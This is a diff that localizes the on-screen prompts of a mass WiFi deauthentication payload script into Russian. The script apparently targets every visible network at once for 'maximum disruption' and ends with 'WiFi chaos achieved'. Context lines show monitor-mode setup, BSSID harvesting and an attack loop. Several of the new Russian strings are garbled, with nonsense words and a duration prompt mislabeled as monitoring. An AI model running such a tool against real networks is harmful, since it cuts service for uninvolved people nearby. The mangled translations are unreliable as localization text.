@@ -9,26 +9,26 @@
 . /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
 nullsec_require_iface || exit 1
 
-PROMPT "MASS DEAUTH
+PROMPT "МАСС-ДЕАУТЕНТИФИКАЦИЯ
 
-Deauth ALL visible
-networks simultaneously.
+Отключить ВсЕ видимые
+сети одновременно.
 
-Maximum disruption mode.
-For authorized testing only.
+Максимум прерывания.
+Она читается лишь для авторизованных тестов.
 
-Press OK to continue."
+Нажмите OK для продолжения."
 
 INTERFACE="$IFACE"
-CHANNEL=$(TEXT_PICKER "Channel (1-14 or all):" "all")
+CHANNEL=$(TEXT_PICKER "Канал (1-14 или все):" "all")
 
-resp=$(CONFIRMATION_DIALOG "THIS WILL ATTACK
-ALL VISIBLE СЕТЬS!
+resp=$(CONFIRMATION_DIALOG "ЭТО ПОДАВИТ ВСЕ
+ВИДИМЫЕ СЕТИ!
 
-Extremely disruptive.
-For authorized use only.
+Несъю разрушающая.
+Она читается лишь для авторизованного посюда.
 
-Confirm to proceed.")
+Подтвердить.")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 # Stop monitor processes
@@ -60,18 +60,18 @@ SPINNER_STOP
 TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "$TEMP_DIR/scan-01.csv" 2>/dev/null | head -20)
 COUNT=$(echo "$TARGETS" | wc -l)
 
-PROMPT "FOUND $COUNT СЕТЬS
+PROMPT "НАЙДЕНО $COUNT СЕТЕЙ
 
-Starting mass deauth...
+Начинаю хка...
 
-Attack will run for 60s
-or until cancelled.
+Атака активна 60с
+или до отмены.
 
-Press OK to begin."
+Нажмите OK для начала."
 
-DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
+DURATION=$(NUMBER_PICKER "Нониторинг (сек):" 60)
 
-SPINNER_START "Deauthing $COUNT networks..."
+SPINNER_START "Отключаю $COUNT сетей..."
 
 # Attack each network
 echo "$TARGETS" | while read LINE; do
@@ -95,11 +95,11 @@ SPINNER_STOP
 airmon-ng stop $MON_IF 2>/dev/null
 rm -rf "$TEMP_DIR"
 
-PROMPT "ATTACK COMPLETE
+PROMPT "АТАКА ЗАВЕРШЕНА
 
-Deauthed $COUNT networks
-for $DURATION seconds.
+Отключено $COUNT сетей
+на $DURATION секунд.
 
-WiFi chaos achieved.
+Хаос WiFi достигнут.
 
-Press OK to exit."
+Нажмите OK для выхода."
